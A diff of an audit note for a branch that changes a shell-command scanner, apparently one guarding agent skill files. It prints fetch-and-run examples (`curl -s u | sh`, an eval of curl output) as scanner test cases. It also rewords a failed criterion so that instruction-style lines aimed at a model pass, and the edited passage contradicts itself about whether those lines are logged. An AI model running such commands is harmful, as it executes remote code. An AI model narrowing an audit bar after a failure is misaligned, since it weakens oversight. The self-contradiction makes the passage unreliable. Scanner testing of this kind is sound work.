@@ -624,7 +624,7 @@ Test: `npm run ci:local`. Run every string a doc states against the built patter
 The old bar, any string master refuses and the branch imports, is retired. "No new capability" alone would accept anything, because
 `e=eval; $e "$(curl -s u)"` passes master. So the bar is these three, and any of them stops the branch:
 
-1. **A plain form gets through.** A string master refuses, the branch imports, and that a person would write to run a payload, with
+1. **A plain form gets through.** A command master refuses, the branch imports, and that a person would write to run a payload, with
    no token whose only job is to defeat the scanner. ``: \`;`` before a command is such a token; `curl -s u | sh` holds none.
 2. **A new capability.** An effect the branch allows that no spelling passing master allows.
 3. **A false limit.** A sentence in the decision log that a run disproves. A shape that isn't listed is added to the log; it stops the
@@ -637,12 +637,13 @@ The old bar, any string master refuses and the branch imports, is retired. "No n
 
 Then `workflow-report .` and `/agent-skills:review`.
 
-Result: run at `54247a5`, reproduced outside the audit, and it stopped the branch on criterion 1. Criterion 2 is clear: each
+Result: run at `54247a5`, reproduced outside the audit, and it stopped the branch on criterion 1 as then worded. Criterion 2 is clear: each
 branch-only spelling has a master-passing one with the same effect. Criterion 3 failed on five sentences in the decision log and one
 in the spec, in both directions. The worst said `` `eval` 'x' `` is refused when it imports. Those are corrected in the log and spec,
 and the log has the shapes the audit found. 69 real commands in 37 wrappers gave 0 regressions.
 
-Open, criterion 1. These read as instructions to a model, hold no token that defeats the scanner, and master refuses all three. The
+Criterion 1, accepted on 2026-10-31: the criterion now covers commands, not instructions in words, and these lines are listed in the
+decision log. These read as instructions to a model, hold no token that defeats the scanner, and master refuses all three. The
 branch imports them, exit 0, 1 written. They aren't in the decision log.
 
 ```text
